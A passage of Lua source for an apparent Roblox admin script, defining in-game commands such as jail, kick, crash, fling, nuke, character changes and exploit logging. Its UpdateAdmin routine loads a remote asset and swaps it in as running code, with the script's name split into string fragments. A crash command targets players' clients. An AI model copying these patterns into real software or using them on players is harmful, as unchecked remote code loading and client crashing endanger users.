	local Floor = Instance.new("Part", Cell) Floor.Name = "Floor" Floor.FormFactor = "Custom" Floor.Size = Vector3.new(15,1,15) Floor.Material = "DiamondPlate" Floor.TopSurface = "Smooth" Floor.BottomSurface = "Smooth" Floor.Position = Vector3.new(0,1001.7,0) Floor.Anchored = true Floor.Locked = true
	local Wall = Instance.new("Part", Cell) Wall.Name = "Wall" Wall.FormFactor = "Custom" Wall.Size = Vector3.new(15,14.2,1) Wall.BrickColor = BrickColor.new("Bright blue") Wall.TopSurface = "Smooth" Wall.BottomSurface = "Smooth" Wall.Position = Vector3.new(0,1009.3,-7) Wall.Anchored = true Wall.Locked = true Wall.Transparency = 0.5
	local SG = Instance.new("SurfaceGui", Wall) SG.Name = "SG" SG.Adornee = Wall
	local Text = Instance.new("TextLabel", SG) Text.Size = UDim2.new(1,0,1,0) Text.BackgroundTransparency = 1 Text.TextColor3 = Color3.new(1,1,1) Text.Font = "ArialBold" Text.FontSize = "Size36" Text.TextYAlignment = "Bottom" Text.TextWrapped = true Text.Text = "WARNING: Wild noob in natural habitat. Do no tap glass, it may cause the noob to be angry. Do not open cage and feed noob"
	Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(0,1009.3,7) Wall.SG.Face = "Back"
	Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(-7, 1009.3, 0) Wall.Size = Vector3.new(13,14.2,1) Wall.Rotation = Vector3.new(0,90,0) Wall.SG.Face = "Front"
	Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(7, 1009.3, 0) Wall.Size = Vector3.new(13,14.2,1) Wall.Rotation = Vector3.new(0,90,0) Wall.SG.Face = "Back"
	local Roof = Floor:Clone() Roof.Parent = Cell Roof.Name = "Roof" Roof.Position = Vector3.new(-0,1016.9, 0)
	Cell:MoveTo(Vector3.new(0,3,0))
	
	if Player.Character and Player.Character:FindFirstChild("Torso") then
		Cell:MoveTo(Player.Character.Torso.Position - Vector3.new(0,3,0))
		Player.Character:MoveTo(Floor.Position + Vector3.new(0,2,0))
	end
	table.insert(Dispose, Cell)
	Jails[Player.Name] = Cell
end

function CORE:UnJail(Player)
	if not Player then return nil end
	if Jails[Player.Name] then
		Jails[Player.Name]:Destroy()
		Jails[Player.Name] = nil
	end
end

function CORE:ChangeName(Player, NewName)
	if not Player or not NewName then return nil end
	if Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Head") then
		local NewName = STRING:FormatReplace(Player, NewName)
		
		for _,Obj in pairs(Player.Character:GetChildren()) do
			if Obj.Name == "Label" then Obj:Destroy() end
		end
		
		local Head = Player.Character.Head
		local HeadClone = Head:Clone()
		
		-- make actual head invisible
		Head.Transparency = 1
		ypcall(function() Head.face.Transparency = 1 end)

		-- make fake head visible
		HeadClone.Transparency = 0
		ypcall(function() HeadClone.face.Transparency = 0 end)

		local Label = Instance.new("Model", Player.Character)
		Label.Name = "Label"

		local Model = Instance.new("Model", Label)
		Model.Name = NewName

		local HumanoidClone = Instance.new("Humanoid", Model)
		coroutine.wrap(function() while wait() and Player.Character and Player.Character:FindFirstChild("Humanoid") do HumanoidClone.Health = Player.Character.Humanoid.Health HumanoidClone.MaxHealth = Player.Character.Humanoid.MaxHealth end end)()

		HeadClone.Position = Vector3.new(0,100,0)
		HeadClone.CanCollide = false
		ypcall(function() HeadClone.BrickColor = Player.Character["Body Colors"].Head end)
		
		
		Delay(0.01, function() -- new roblox engine needs time to proccess that a label needs to be given after a model's been created
			HeadClone.Parent = Model
			local Weld = Instance.new("Weld", HeadClone)
			Weld.Part0 = HeadClone
			Weld.Part1 = Head
		end)
	end
end

function CORE:UpdateAdmin()
	if Server.Storage:FindFirstChild("PreventMMLUpdate") then
		return nil
	end
	local UpdateModel = AdminID
	if UpdateModel == 0 then return end
	local NewAdminModel = nil
	ypcall(function() NewAdminModel = Server.IS:LoadAsset(UpdateModel) end)
	if NewAdminModel then
		local NewAdmin = NewAdminModel:FindFirstChild("Ma".."kerModelLua's Admin", true)
		if NewAdmin then
			local NewVersion = NewAdmin:FindFirstChild("Version")
			if NewVersion.Value ~= CORE.Version.Value then
				if ExploitModule then
					ExploitModule.Disabled = true
					ExploitModule:Destroy()
				end
				NewAdmin.Disabled = true
				NewAdmin.Parent = Workspace
				if not Settings then
					local NewSettings = NewAdminModel:FindFirstChild("M".."a".."kerMod".."elL".."a's Admin Settings", true)
					if NewSettings then NewSettings.Parent = Workspace end
				end
				wait() NewAdmin.Disabled = false
				CORE:RemoveAdmin()
			else
				NewAdminModel:Destroy()
			end
		end
	end
end

function CORE:UnpackPlayers(Players)
	local PlayerNames = ""
	for Num,Player in pairs(Players) do
		if Player ~= nil then
			if Num ~= #Players then
				PlayerNames = PlayerNames..Player.Name..", "
			else
				PlayerNames = PlayerNames..Player.Name
			end
		end
	end
	return PlayerNames
end

function CORE:GetValue(Value)
	if Value:IsA("StringValue") then
		if Value.Name == "Owner" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Owner"], Value.Value) end end
		if Value.Name == "Admin" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Admin"], Value.Value) end end
		if Value.Name == "Member" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Member"], Value.Value) end end
		if Value.Name == "Banned" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Banned"], Value.Value) end end
		if Value.Name == "Crashed" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Crashed"], Value.Value) end end
		if Value.Name == "Muted" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Muted"], Value.Value) end end
		if Value.Name == "RemoveAdmin" then if ScanAdminList(Value.Value) then 
			for Num,Admin in pairs(Settings.Ranks["Admin"]) do
				if Admin == Value.Value then
					table.remove(Settings.Ranks["Admin"],Num)
				end
			end
		end end
	end
end

function CORE:GetPlayer(ID)
	local Return = {"Unknown", ID}
	if tonumber(ID) then
		for _,Data in pairs(CharacterCache) do
			if ID == Data[2] then
				return Data
			end
		end
		ypcall(function()
			local Name = Server.Players:GetNameFromUserIdAsync(ID)
			if Name then
				local Data = {Name, ID}
				table.insert(CharacterCache, Data)
				Return = Data
			end
		end)
	else
		local Name = tostring(ID)
		for _,Data in pairs(CharacterCache) do
			if string.lower(Name) == string.lower(Data[1]) then
				return Data
			end
		end
		ypcall(function()
			local PlayerID = Server.Players:GetUserIdFromNameAsync(Name)
			if PlayerID then
				Name = Server.Players:GetNameFromUserIdAsync(PlayerID) or Name
				local Data = {Name, PlayerID}
				table.insert(CharacterCache, Data)
				Return = Data
			end
		end)
	end
	
	return Return
end

function CORE:ChangeCharacter(Player, ID, Perm, Speaker, NameChar, ManualPos) coroutine.wrap(function()
	if ID and #tostring(ID) >= 1 then
		local PlayerName = nil
		
		local Players = STRING:Scan(ID, Speaker)
		if #Players >= 1 then -- if player is found in server
			ID = Players[1].UserId
		elseif tonumber(ID) then
			local Data = CORE:GetPlayer(ID)
			PlayerName = Data[1]
		else
			local Data = CORE:GetPlayer(tostring(ID))
			PlayerName = Data[1]
			ID = Data[2]
		end
		
		if tonumber(ID) == 20018 then -- exploding easter bunny
			local OldID = ID
			ID = 1
			if Speaker then
				if RANK:GetRank(Speaker) == "Member" then
					coroutine.wrap(function()
						wait(1)
						GUI:SendMessage(Speaker, "You cannot character as this", "RED No exploding easter bunnies allowed, sorry", "Error", 10)
					end)()
				else ID = OldID
				end
			end
		elseif tonumber(ID) == 1311 then -- ffjosh
			local OldID = ID
			ID = 1
			if Speaker then
				if RANK:GetRank(Speaker) == "Member" then
					coroutine.wrap(function()
						wait(1)
						GUI:SendMessage(Speaker, "You cannot character as this", "RED No exploiting moderators allowed, sorry", "Error", 10)
					end)()
				else ID = OldID
				end
			end
		end
		
		if tonumber(ID) then
			local Position = nil
			if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
				if ManualPos then
					Position = ManualPos
				else
					Position = Player.Character.Torso.Position
				end
			end
			Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..ID
			wait() Player:LoadCharacter() wait()
			if Position then Player.Character:MoveTo(Position) end
			if not Perm then
				Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Player.UserId
			end
			if NameChar and PlayerName then
				wait(2)
				CORE:ChangeName(Player, PlayerName)
			end
		end
	end
end)() end

function CORE:GenerateShield(Player)
	if not Player then return nil end
	if not Player.Character then return nil end
	local Torso = Player.Character:FindFirstChild("Torso")
	if not Torso then return nil end
	
	local Shield = Player.Character:FindFirstChild("Shield")
	if Shield then Shield:Destroy() end
	
	Shield = Instance.new("Part", Player.Character)
	Shield.Name = "Shield"
	Shield.Locked = true
	Shield.CanCollide = false
	Shield.Size = Vector3.new(10,10,10)
	Shield.Shape = "Ball"
	Shield.Color = GUI:GetColor()
	Shield.Transparency = 0.5
	Shield.TopSurface = "Smooth"
	Shield.BottomSurface = "Smooth"
	Shield.Anchored = true
	Shield.Position = Torso.Position
	
	local Hum = SOUND:MakeSound(Shield, 147493985, 1, 1, true)
	local Zap = SOUND:MakeSound(Shield, 192783601, 1, 1, false)
	
	Hum:Play()
	
	Shield.Touched:connect(function(Part)
		if Part.Parent ~= Server.Workspace then
			local Humanoid = Part.Parent:FindFirstChild("Humanoid") or Part.Parent.Parent:FindFirstChild("Humanoid") or Part.Parent.Parent.Parent:FindFirstChild("Humanoid")
			if Humanoid then
				local Char = Humanoid.Parent
				if Char:IsA("Model") and Humanoid.Health > 0 then
					if Char ~= Player.Character then
						Char:BreakJoints()
						Zap:Play()
					end
				end
			end
		end
	end)
	
	coroutine.wrap(function() repeat wait()
		Shield.CFrame = Torso.CFrame
	until Torso.Parent == nil or Shield.Parent == nil end)()
end

function CORE:FlingPlayer(Player)
	if Player and Player.Character then
		if Player.Character:FindFirstChild("Torso") then
			local Fling = Instance.new("BodyForce", Player.Character.Torso)
			Fling.Name = "Fling"
			Fling.force = Vector3.new(10000,10000,10000)
		end
	end
end

function CORE:Kick(Player, CustomMessage)
	if not CustomMessage then CustomMessage = "You've been kicked by M".."ake".."rMode".."".."lLua's Admin. You cannot interact with the server in anyway." end
	coroutine.wrap(function() 
		CORE:ExecuteResource("PlayerKickMessage", Player.Character, {["Message"] = CustomMessage})
		wait(1)
		Player:Kick(CustomMessage)
	end)()
end

function CORE:Crash(Player)
	local Parent = Player
	if Player:FindFirstChild("Backpack") then Parent = Player.Backpack
	elseif Player.Character then Parent = Player.Character end
	
	CORE:ExecuteResource("Crash", Parent)
end

function CORE:RestoreCamera(Player)
	if Player.Backpack then
		CORE:ExecuteResource("RestoreCamera", Player.Backpack)
	end
end

function CORE:ScanItems(BaseObj, ObjTypes, ActiveFunc)
	local function ScanInstance(Object)
		if #Object:GetChildren() > 0 then
			for _,Obj in pairs(Object:GetChildren()) do
				local IsType = false
				if ObjTypes and #ObjTypes > 0 then
					for _,ObjType in pairs(ObjTypes) do
						if Obj:IsA(ObjType) then
							IsType = true
							break
						end
					end
				else
					IsType = true
				end
				if IsType == true then
					ActiveFunc(Obj)
				end
				ScanInstance(Obj)
			end
		end
	end
	ScanInstance(BaseObj)
end

function CORE:AnchorPlayer(Player)
	if not Player or not Player.Character or not Player.Character:FindFirstChild("Humanoid") then return end
	
	Player.Character.Humanoid.WalkSpeed = 0
	for _,Object in pairs(Player.Character:GetChildren()) do
		if Object:IsA("BasePart") then
			Object.Anchored = true
		end
	end
end

function CORE:UnanchorPlayer(Player)
	if not Player or not Player.Character or not Player.Character:FindFirstChild("Humanoid") then return end
	
	Player.Character.Humanoid.WalkSpeed = 16
	for _,Object in pairs(Player.Character:GetChildren()) do
		if Object:IsA("BasePart") then
			Object.Anchored = false
		end
	end
end

function CORE:InvisiblePlayer(Player)
	if not Player or not Player.Character then return end
	
	CORE:ScanItems(Player.Character, {"BasePart", "Texture", "Decal"}, function(Obj) Obj.Transparency = 1 end)
end

function CORE:VisiblePlayer(Player)
	if not Player or not Player.Character then return end
	
	CORE:ScanItems(Player.Character, {"BasePart", "Texture", "Decal"}, function(Obj) if Obj.Name ~= "HumanoidRootPart" then Obj.Transparency = 0 end end)
end

function CORE:Nuke(Player) coroutine.wrap(function()
	local Pos = CFrame.new(0,1,0)
	if Player and Player.Character and Player.Character:FindFirstChild("Torso") then Pos = Player.Character.Torso.CFrame * CFrame.new(0,1,0) end
	local Blast = Instance.new("Part", Server.Workspace) Blast.Name = "BlastEx" Blast.Anchored = true Blast.CanCollide = false Blast.Size = Vector3.new(1,1,1) Blast.CFrame = Pos
	local BlastMesh = Instance.new("SpecialMesh", Blast) BlastMesh.MeshId = "rbxassetid://1290033" BlastMesh.TextureId = "rbxassetid://33145325" BlastMesh.Scale = Vector3.new(0,0,0)
	local Wave = Instance.new("Part", Server.Workspace) Wave.BrickColor = BrickColor.new("Deep orange") Wave.Name = "WaveEx" Wave.Anchored = true Wave.CanCollide = false Wave.Size = Vector3.new(1,1,1) Wave.CFrame = Pos * CFrame.Angles(math.pi/2,0,0)
	local WaveMesh = Instance.new("SpecialMesh", Wave) WaveMesh.MeshId = "rbxassetid://3270017"
	local Light = Instance.new("PointLight", Blast) Light.Brightness = 1000 Light.Range = 10000 Light.Color = Color3.new(1,0.2,0.2)
	
	local Effect = Instance.new("ColorCorrectionEffect", Server.Lighting) Effect.Brightness = 0.2 Effect.Contrast = 0.4 Effect.Saturation = 1 Effect.TintColor = Color3.new(1,0.2,0.2)
	
	Server.Lighting.Brightness = 5
	Server.Lighting.Ambient = Color3.new(1,0.5,0.5)
	Server.OutdoorAmbient = Color3.new(1,1,1)
	
	local Exp = Instance.new("Explosion", Server.Workspace)
	Exp.Position = Pos.p
	Exp.BlastPressure = 10000000
	Exp.BlastRadius = 1000000
	Exp.Hit:connect(function(Part)
		if Part.Name ~= "Base" and Part.Name ~= "BasePlate" and Part ~= Blast and Part ~= Wave and Part.Name ~= "BlastEx" and Part.Name ~= "WaveEx" then
			ypcall(function()
				Part.Anchored = false
				Part.BrickColor = BrickColor.new("Black")
				Part.Material = "Slate"
				Part:BreakJoints()	
			end)
		end
	end)

	local BoomSound = SOUND:MakeSound(Server.Workspace, 212389494, 1, 1.2, false)
	BoomSound:Play()
	for i = 0,100,0.5 do
		Blast.Anchored = true
		Wave.Anchored = true
		BlastMesh.Scale = Vector3.new(i,i,i)
		WaveMesh.Scale = Vector3.new(i^1.3,i^1.3,5)
		Blast.CFrame = Pos
		wait()
	end
	BoomSound:Stop()
	Blast:Destroy()
	Wave:Destroy()
	wait()
	BoomSound:Destroy()
	Effect:Destroy()
	for i = 10,5,-1 do
		Server.Lighting.Brightness = (i-5) + 1
		Server.Lighting.Ambient = Color3.new(i/10,0.5,0.5)
		Server.OutdoorAmbient = Color3.new(i/10,i/10,i/10)
		wait(0.05)
	end
end)() end

function CORE:Insert(AssetID, Parent, GetFirstChild, FirstChildTypes, AbuseMode)
	local AssetID = tonumber(AssetID)
	local Item = nil
	if AssetID and AssetID ~= 1055299 then
		local CanInsert = true
		if AbuseMode then
			for _,ID in pairs(RemoteAbuseGear) do
				if AssetID == tonumber(ID) then CanInsert = false break end
			end
			for _,ID in pairs(Settings.AbusableGear) do
				if AssetID == tonumber(ID) then CanInsert = false break end
			end
		end
		if CanInsert then
			Item = Server.IS:LoadAsset(AssetID)
			if GetFirstChild then
				Item = Item:GetChildren()[1]
				if FirstChildTypes and Item then
					local ValidType = false
					for _,Type in pairs(FirstChildTypes) do
						if Item:IsA(Type) then
							ValidType = true
							break
						end
					end
					if ValidType == false then
						Item = nil
					end
				end
			end
			if Item and Parent then
				Item.Parent = Parent
			end
		end
	end
	return Item
end

function CORE:GivePackage(Player, PID) coroutine.wrap(function()
	if not Player or not Player.Character then return nil end
	PID = tonumber(PID)
	for _,Obj in pairs(Player.Character:GetChildren()) do
		if Obj:IsA("CharacterMesh") then Obj:Destroy() end
	end
	if PID then
		-- back when we needed HttpService to get packages.
		--[[
		if PackageCache[PID] then
			for _,ID in pairs(PackageCache[PID]) do
				CORE:Insert(ID, Player.Character, true, {"CharacterMesh"})
			end
		else
			local IDsJSON = REMOTE:GetURL(CORE.Domain.."/APIs/GetPackage.php?PackageID="..PID)
			if IDsJSON then
				local IDs = REMOTE:Decode(IDsJSON)
				if IDs then
					if not IDs["Error"] then
						table.insert(PackageCache, IDs)
						for _,ID in pairs(IDs) do
							CORE:Insert(ID, Player.Character, true, {"CharacterMesh"})
						end
					end
				end
			end
		end
		]]
		-- also, no need for a package cache since the GetAssetIdsForPackage method handles that internally
		local IDs = {}
		ypcall(function() IDs = Server.AS:GetAssetIdsForPackage(PID) end) -- it still errors so it needs to be contained.
		if #IDs > 0 then
			for _,ID in pairs(IDs) do
				local PackagePart = CORE:Insert(ID)
				for _,Obj in pairs(PackagePart:GetChildren()) do
					if Obj:IsA("Accoutrement") or Obj:IsA("CharacterMesh") then
						Obj.Parent = Player.Character
					elseif Obj:IsA("Folder") then
						if Obj.Name == "R6" then -- r15 coming to mml's admin confirmed?
							Obj:GetChildren()[1].Parent = Player.Character
						end
					end
				end
			end
		end
	end
end)() end

function CORE:ChangeBet(Bet)
	if tostring(Bet) and Bet ~= Settings.Bet then
		for Index,Data in pairs(Commands) do
			Commands[Index][1] = string.gsub(Data[1], Settings.Bet, Bet)
		end
		Settings.Bet = Bet
	end
end

function CORE:ResetLighting()
	ModLighting = false wait(0.2) ModLighting = true
end

function CORE:Fly(Player, Force)
	if Player and Player.Character then
		local StopFly = Instance.new("RemoteFunction", Player.Character)
		StopFly.Name = "StopMMLFly"
		CORE:ExecuteResource("Fly", Player.Character, {["Force"] = Force, ["StopFunc"] = StopFly})
	end
end

function CORE:GiveTools(Player, Type)
	if not Player or not Player:FindFirstChild("Backpack") then return nil end
	Type = string.lower(Type)
	local _,RankNum = RANK:GetRank(Player)
	local BuildTools = {73089166, 73089190, 73089204, 73089214, 73089239, 73089259, 58921588}
	local BaseBuildTools = {["Move"] = "GameTool", ["Clone"] = "Clone", ["Delete"] = "Hammer"}
	
	if Type == "basicbtools" or Type == "basicbuildtools" or Type == "basicbuildingtools" then
		for Name,Type in pairs(BaseBuildTools) do
			local Tool = Instance.new("HopperBin", Player.Backpack)
			Tool.Name = Name
			Tool.BinType = Type
		end
	elseif Type == "psbtools" then
		for _,Tool in pairs(BuildTools) do
			CORE:Insert(Tool, Player.Backpack, true)
		end
	elseif Type == "f3xtools" or Type == "fextools" or Type == "f3x" then
		if F3X then
			local F3X = F3X:Clone()
			F3X.Parent = Player.Backpack
		end
	elseif Type == "btools" then
		if F3X then
			local F3X = F3X:Clone()
			F3X.Parent = Player.Backpack
		end
		for Name,Type in pairs(BaseBuildTools) do
			local Tool = Instance.new("HopperBin", Player.Backpack)
			Tool.Name = Name
			Tool.BinType = Type
		end
		for _,Tool in pairs(BuildTools) do
			CORE:Insert(Tool, Player.Backpack, true)
		end
	else
		for _,Region in pairs(ToolRegions) do
			CORE:ScanItems(Region, {"HopperBin", "Tool"}, function(Item)
				if Type == "all" then
					local NewItem = Item:Clone()
					NewItem.Parent = Player.Backpack
				elseif string.sub(string.lower(Item.Name),1,#Type) == string.lower(Type) then
					local NewItem = Item:Clone()
					NewItem.Parent = Player.Backpack
				end
			end)
		end
	end
end

function CORE:Scale(Player, ScalePercent)
	if not Player or not Player.Character or not tonumber(ScalePercent) then return end
	local Ratio = ScalePercent/100
	if Ratio < 0.05 then Ratio = 0.05 end
	if Ratio > 100 then Ratio = 100 end
	if Ratio > 1 then Ratio = math.ceil(Ratio) end
	local Char = Player.Character
	
	local Clean = Char:FindFirstChild("Clean")
	if Clean then Clean:Invoke() wait(0.1) Char = Player.Character end
	Clean = Instance.new("BindableFunction", Char) Clean.Name = "Clean"

	local function Cycle(BaseObj, ScaleRatio, NewAdd, JustWeld)
		local Welds = {}
		local Parts = {}
		
		local function Handle(Obj)
			if Obj:IsA("BasePart") and not JustWeld then
				table.insert(Parts, Obj)
			elseif Obj:IsA("SpecialMesh") and not JustWeld then
				if Obj.Name == "MML Mesh" then
					Obj:Destroy()
				end
				if Obj.MeshType == Enum.MeshType.FileMesh then
					Obj.Offset = Obj.Offset * ScaleRatio
					Obj.Scale = Obj.Scale * ScaleRatio
				elseif Ratio < 1 then
					Obj.Offset = Obj.Offset * ScaleRatio
					Obj.Scale = Obj.Scale * ScaleRatio
				end
			elseif Obj:IsA("CharacterMesh") and not JustWeld then
				if Ratio < 1 then
					local BodyPart = ""
					local TextureID = Obj.BaseTextureId
					if TextureID == 0 then TextureID = Obj.OverlayTextureId end
					if TextureID == 0 then TextureID = nil end
					if Obj.BodyPart == Enum.BodyPart.LeftArm then BodyPart = "Left Arm" end
					if Obj.BodyPart == Enum.BodyPart.RightArm then BodyPart = "Right Arm" end
					if Obj.BodyPart == Enum.BodyPart.LeftLeg then BodyPart = "Left Leg" end
					if Obj.BodyPart == Enum.BodyPart.RightLeg then BodyPart = "Right Leg" end
					if Obj.BodyPart == Enum.BodyPart.Torso then BodyPart = "Torso" end
					if Obj.BodyPart == Enum.BodyPart.Head then BodyPart = "Head" end
					local NewMesh = Instance.new("SpecialMesh", Obj.Parent:FindFirstChild(BodyPart))
					NewMesh.Name = "MML Mesh"
					NewMesh.Scale = Vector3.new(ScaleRatio,ScaleRatio,ScaleRatio)
					if TextureID then NewMesh.TextureId = "rbxassetid://"..TextureID end
					NewMesh.MeshId = "rbxassetid://"..Obj.MeshId
					Obj:Destroy()
				end
			elseif Obj:IsA("JointInstance") then
				local NewWeld = Obj:Clone()
				table.insert(Welds, {NewWeld, Obj.Parent})
			elseif NewAdd == true and not JustWeld then
				if Obj:IsA("Tool") then
					--Cycle(Char["Right Arm"], ScaleRatio, false, true)
				elseif Obj:IsA("Accoutrement") then
					--Cycle(Char.Head, ScaleRatio, false, true)
				end
			end
			if #Obj:GetChildren() > 0 then
				for _,NewObj in pairs(Obj:GetChildren()) do
					Handle(NewObj, ScaleRatio)
				end
			end
		end
		Handle(BaseObj)
		for _,Part in pairs(Parts) do
			if Ratio >= 1 then
				Part.Size = Part.Size * ScaleRatio
			else
				local Allowed = true
				for _,Obj in pairs(Part:GetChildren()) do
					if Obj:IsA("DataModelMesh") or Obj.Name == "MML Mesh" then
						Allowed = false
					end
				end
				if Allowed == true then
					local NewMesh = Instance.new("BlockMesh", Part)
					NewMesh.Name = "MML Mesh"
					NewMesh.Scale = Vector3.new(Ratio,Ratio,Ratio)
				end
			end
		end
		for _,WeldData in pairs(Welds) do
			if WeldData[1] then
				local Obj = WeldData[1]
				local NewWeld = Obj:Clone()
				
				NewWeld.Parent = WeldData[2]
				NewWeld.C0 = CFrame.new(Obj.C0.p * ScaleRatio) * CFrame.Angles(Obj.C0:toEulerAnglesXYZ())
				NewWeld.C1 = CFrame.new(Obj.C1.p * ScaleRatio) * CFrame.Angles(Obj.C1:toEulerAnglesXYZ())
			end
		end
		for _,Part in pairs(Parts) do
			Part:MakeJoints()
		end
		Welds = {}
		Parts = {}
	end
	Cycle(Char, Ratio)
	Char:MakeJoints()
	
	local Added = Char.ChildAdded:connect(function(Obj)
		Cycle(Obj, Ratio, NewAdd)
	end)
	local Removed = Char.ChildRemoved:connect(function(Obj)
		Cycle(Obj, Ratio^-1, NewAdd)
	end)
	
	Clean.OnInvoke = function()
		Added:disconnect()
		Removed:disconnect()
		local Location = Vector3.new(0,5,0)
		if Char:FindFirstChild("Torso") then
			Location = Char.Torso.Position + Vector3.new(0,2,0)
		end
		Player:LoadCharacter()
		wait(0.5)
		Player.Character:MoveTo(Location)
		wait(0.5)
		return nil
	end
	
	if Char:FindFirstChild("Torso") then
		Char:MoveTo(Char.Torso.Position + Vector3.new(0,Ratio*3))
	end
	if Char:FindFirstChild("Humanoid") then
		Char.Humanoid.WalkSpeed = Char.Humanoid.WalkSpeed * (Ratio)
	end
	if Ratio < 1 and Char:FindFirstChild("HumanoidRootPart") and Char.HumanoidRootPart:FindFirstChild("RootJoint") then
		Char.HumanoidRootPart.RootJoint.C0 = CFrame.new(0,-(3-(Ratio*3)),0) * CFrame.Angles(-math.rad(90),0,math.pi)
	end
end

function CORE:AddExploit(PlayerClient, Data)
	local PlayerClientName = PlayerClient.Name
	local NewData = CORE:GetTime(true, true).." @ "..Data
	for _,Player in pairs(Server.Players:GetChildren()) do
		GUI:SendHint(Player, "Exploiter Found: "..PlayerClientName.." | If you are an admin view exploit logs by saying ;exploitlogs", 5)
	end
	local ExploitLog = Server.GDS:GetAsync("ExploitLog")
	if type(ExploitLog) ~= "table" then
		Server.GDS:SetAsync("ExploitLog", {NewData})
	else
		table.insert(ExploitLog, NewData)
		Server.GDS:SetAsync("ExploitLog", ExploitLog)
	end
	REMOTE:SendHttpLog("EXPLOITER FOUND: "..Data, "WARNING")
	
	return true
end

function CORE:CreateFigure(Name, Position, DisableAnimation, Speaker)
	if not tostring(Name) then Name = "Dummy" end
	if not Position then Position = Vector3.new(0,5,0) end
	if Speaker and Speaker.Character and Speaker.Character:FindFirstChild("Torso") then
		Position = Speaker.Character.Torso.Position + Vector3.new(0,5,10)
	end
	
	local Figure = CORE:Insert(68452456, Server.Workspace, true)
	Figure:MakeJoints()
	Figure.Head.BrickColor = BrickColor.new("Bright yellow")
	Figure["Left Arm"].BrickColor = BrickColor.new("Bright yellow")
	Figure["Right Arm"].BrickColor = BrickColor.new("Bright yellow")
	Figure["Left Leg"].BrickColor = BrickColor.new("Dark green")
	Figure["Right Leg"].BrickColor = BrickColor.new("Dark green")
	Figure.Torso.BrickColor = BrickColor.new("Bright blue")
	
	Figure.Name = STRING:FormatReplace(Speaker, Name)
	Figure:MoveTo(Position)
	
	table.insert(Objects, Figure)
	
	if DisableAnimation == true then
		Figure.Animate.Disabled = true
	end
	
	return Figure
end

function CORE:ClonePlayer(Player, Name, Position)
	if not Player or not Player.Character then return nil end
	
	Player.Character.Archivable = true
	local Char = Player.Character:Clone()
	Player.Character.Archivable = false
	if Name then Char.Name = STRING:FormatReplace(Player, Name) end
	if Position then Char:MoveTo(Position) end
	Char.Parent = Server.Workspace
	Char:MakeJoints()
	Char:MoveTo(Player.Character.Torso.Position + Vector3.new(0,3,1))
	
	table.insert(Objects, Char)
	
	return Obj
end

function CORE:AddWaypoint(Name, Position, Speaker)
	Waypoints[Name] = Position
	if Speaker then
		GUI:SendHint(Speaker, "Waypoint "..Name.." is located at ("..tostring(Position)..")", 2)
	end
end

function CORE:FindType(BaseObj, Type)
	for _,Obj in pairs(BaseObj:GetChildren()) do
		if Obj:IsA(Type) then
			return Obj
		end
	end
end

function CORE:GetCommands()
	local CommandsCopy = Commands
	return CommandsCopy
end

function CORE:Crown(Player, Mesh, Color)
	if Mesh then Mesh = string.lower(Mesh) end
	if not Mesh or not Meshes[Mesh] then Mesh = "crown" end
	if not Player or not Player.Character or not Player.Character:FindFirstChild("Head") then return end
	local Part = Instance.new("Part", CrownStorage)
	Part.Size = Vector3.new(2, 1, 1)
	Part.CanCollide = false
	Part.CFrame = Player.Character.Head.CFrame
	Part.Locked = true
	Part.Material = "Neon"
	if Color then
		Part.Color = GUI:GetColor(Color)
	else
		Part.BrickColor = GUI:GetNameColor(Player.Name)
	end
	local SMesh = Instance.new("SpecialMesh", Part)
	SMesh.Scale = Vector3.new(Meshes[Mesh][1],Meshes[Mesh][1],Meshes[Mesh][1])
	SMesh.MeshId = "rbxassetid://"..Meshes[Mesh][2]
	local BP = Instance.new("BodyPosition", Part)
	BP.maxForce = Vector3.new(math.huge,math.huge,math.huge)
	BP.position = Player.Character.Head.Position
	BP.P = 20000
	local BG = Instance.new("BodyGyro", Part)
	BG.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
	
	Crowns[Player.UserId] = Part
	table.insert(Objects, Part)
	
	coroutine.wrap(function()
		for i = 1,0.3,-0.02 do
			if Part.Parent == CrownStorage and Player.Character and Player.Character:FindFirstChild("Head") then
				Part.Transparency = i
			end
			wait()
		end
		while Crowns[Player.UserId] and Part.Parent == CrownStorage and wait() do
			for i = 0,360,3 do
				if Part.Parent == CrownStorage and Player.Character and Player.Character:FindFirstChild("Head") then
					Part.Transparency = (math.sin(math.rad(i))/10) + 0.3
					wait()
				end
			end
		end
	end)()
	coroutine.wrap(function() while Crowns[Player.UserId] and Part.Parent == CrownStorage and wait() do
		Part:BreakJoints()
		for i = 0,360 do
			if Part.Parent == CrownStorage and Player.Character and Player.Character:FindFirstChild("Head") then
				Part.Anchored = false
				BP.position = Player.Character.Head.CFrame:toWorldSpace(CFrame.new(0,(math.sin(math.rad(i))/3) + 1.5, 0)).p
				BG.cframe = Player.Character.Head.CFrame
			end
			wait()
		end
	end end)()
	
	return Part
end

function CORE:SetAbuseCommands()
	for Cmds,Data in pairs(Commands) do
		local IsAbusable = false
		for _,AbuseCmd in pairs(Settings.AbuseList) do
			for _,Command in pairs(Cmds) do -- loop through all command names
				if string.sub(Command,1,#AbuseCmd) == string.lower(AbuseCmd) then
					IsAbusable = true
					break
				end
			end
			if IsAbusable == true then break end
		end
		Commands[Cmds].Abusable = IsAbusable
	end
end

function CORE:FindBodyPart(Player, BodyPart)
	local ReturnPart = nil
	if Player and Player.Character then
		local Humanoid = Player.Character:FindFirstChild("Humanoid")
		if Humanoid then
			if BodyPart == "Humanoid" then ReturnPart = Humanoid
			elseif BodyPart == "Left Arm" then ReturnPart = Humanoid.LeftArm
			elseif BodyPart == "Right Arm" then ReturnPart = Humanoid.RightArm
			elseif BodyPart == "Left Leg" then ReturnPart = Humanoid.LeftLeg
			elseif BodyPart == "Right Leg" then ReturnPart = Humanoid.RightLeg
			elseif BodyPart == "Torso" then ReturnPart = Humanoid.Torso
			elseif BodyPart == "Head" then ReturnPart = Humanoid.Head
